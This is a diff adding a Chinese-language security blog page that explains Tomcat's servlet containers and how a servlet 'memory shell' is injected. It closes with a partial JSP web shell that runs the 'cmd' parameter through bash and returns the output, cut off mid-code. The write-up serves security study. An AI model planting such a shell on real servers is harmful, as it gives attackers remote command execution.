@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="w0s1np">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="w0s1np">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="做人不要太攀比 要比就比激光雨">
+    <meta name="description" content="Tomcat Servlet 内存马什么是 ServletServlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 Tomcat 是 Web 应用服务器，是一个 Servlet&#x2F;JSP 容器，Tomcat 作为 Servlet 的容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat Servlet 内存马">
+<meta property="og:url" content="http://w0s1np.github.io/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Lnh&#39;s blog">
+<meta property="og:description" content="Tomcat Servlet 内存马什么是 ServletServlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。 Tomcat 是 Web 应用服务器，是一个 Servlet&#x2F;JSP 容器，Tomcat 作为 Servlet 的容">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/612-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/613.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426192852213-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426194234996-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426194536694-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426195511673-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426200506024-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426201131695-0981070.png">
+<meta property="og:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426214710140-0981070.png">
+<meta property="article:published_time" content="2022-04-26T13:49:22.000Z">
+<meta property="article:modified_time" content="2022-04-26T13:51:19.877Z">
+<meta property="article:author" content="w0s1np">
+<meta property="article:tag" content="javasec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://w0s1np.github.io/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/612-0981070.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>Tomcat Servlet 内存马 · Lnh&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Lnh's blog" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>Lnh's blog</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Lnh&#39;s blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Tomcat Servlet 内存马</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                Tomcat Servlet 内存马
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="javasec">javasec</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.2k</span>Reading time: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/04/26</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Tomcat-Servlet-内存马"><a href="#Tomcat-Servlet-内存马" class="headerlink" title="Tomcat Servlet 内存马"></a>Tomcat Servlet 内存马</h1><h2 id="什么是-Servlet"><a href="#什么是-Servlet" class="headerlink" title="什么是 Servlet"></a>什么是 Servlet</h2><p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p>
+<p>Tomcat 是 Web 应用服务器，是一个 Servlet&#x2F;JSP 容器，Tomcat 作为 Servlet 的容器，能够将用户的请求发送给 Servlet，并且将 Servlet 的响应返回给用户，Tomcat中有四种类型的Servlet容器，从上到下分别是 Engine、Host、Context、Wrapper</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/612-0981070.png" alt="1"></p>
+<p>所以大概的一个层次结构就是 Engine、Host、Context、Wrapper</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/613.png" alt="1"></p>
+<p>Engine: 最顶层容器组件，其下可以包含多个Host，即可以包含一个或多个虚拟主机。它可以根据默认的Host来判断该由哪个虚拟主机处理。</p>
+<p>Host: 一个 Host 代表一个虚拟主机。当 Host 获得一个请求时，将把该请求匹配到某个 Context 上，然后把该请求交给该 Context 来处理。</p>
+<p>Context: 一个 Context 代表一个 Web 应用，一个 Web 应用由一个或者多个 Servlet 实例组成。</p>
+<p>Wrapper: 一个 Wrapper 代表一个 Servlet，负责管理一个 Servlet 的动作。因为是最底层容器，所以不能进行 addChild。</p>
+<h2 id="Tomcat-Servlet-流程分析"><a href="#Tomcat-Servlet-流程分析" class="headerlink" title="Tomcat Servlet 流程分析"></a>Tomcat Servlet 流程分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servletDemo</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Servlet开启&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>servlet.servletDemo<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/servlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先看一下 Servlet 是如何初始化的，在<code>org.apache.catalina.core.StandardWrapper#setServletClass()</code>处下断点调试，然后往上回溯：</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426192852213-0981070.png" alt="image-20220426192852213"></p>
+<p>这里就是 Wrapper 的初始化流程，首先创建了 wrapper ，再调用 set 方法配置 wrapper 相关属性，这里需要注意到 LoadOnStartup 属性，它是一个启动优先级的东西，后面再来分析。</p>
+<p>然后继续配置 wrapper 的 servletClass:</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426194234996-0981070.png" alt="image-20220426194234996"></p>
+<p>配置完之后就会把 wrapper 放入 StandardContext 的 child 中</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426194536694-0981070.png" alt="image-20220426194536694"></p>
+<p>然后会遍历 web.xml 中 servlet-mapping 的 servlet-name 和对应的 url-pattern，再调用<code>StandardContext.addServletMappingDecoded()</code>添加 servlet 对应的映射:</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426195511673-0981070.png" alt="image-20220426195511673"></p>
+<p>到此 Servlet 初始化就完成了，主要流程就是：</p>
+<p>先 context.createWapper 创建一个 Wapper 对象，然后设置 Servlet 的 LoadOnStartUp，name，class，再将 Servlet 添加到 context 的 children 中，最后然后把 url 和 servlet 做映射</p>
+<p>我们在来看一下 servlet 是如何装载的：</p>
+<p>在<code>org.apache.catalina.core.StandardWapper#loadServlet()</code>处下断点调试，然后回溯到<code>StandardContext.startInternal()</code>方法，可以发现 Tomcat 启动加载的顺序：Listener -&gt; Filter -&gt; Servlet：</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426200506024-0981070.png" alt="image-20220426200506024"></p>
+<p>这里调用了 findChildren ，即把所有Wapper（负责管理Servlet）传到<code>loadOnStartUp()</code>方法处理，跟进 loadOnstartup()：</p>
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426201131695-0981070.png" alt="image-20220426201131695"></p>
+<p>首先获取 Context 下所有的 Wapper 类，将 &gt;&#x3D; 0 的项加载到一个存放 Wapper 的 list 中，即这个方法只会将所有 load-on-startup 属性大于 0 的 wrapper 加载。其实这个属性就是表明这个 servlet 被加载的先后顺序，默认值为 -1 ，我们可以在 web.xml 中进行 Servlet 的启动顺序声明：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>servletDemo<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>servlet.servletDemo<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以如果我们想 Tomcat 加载我们动态注册的 servlet 就需要设置 loadOnstartup 属性</p>
+<h2 id="内存马注入流程分析"><a href="#内存马注入流程分析" class="headerlink" title="内存马注入流程分析"></a>内存马注入流程分析</h2><ol>
+<li><p>获取StandardContext</p>
+</li>
+<li><p>创建恶意的 Servlet </p>
+</li>
+<li><p>创建 Wapper 对象</p>
+</li>
+<li><p>设置 Servlet 的 LoadOnStartUp，name，class</p>
+</li>
+<li><p>将 Servlet 添加到 context 的 children 中</p>
+</li>
+<li><p>最后把 url 和 servlet 做映射</p>
+</li>
+</ol>
+<p>代码实现：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">servletevil</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, len));</span><br><span class="line">                process.destroy();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        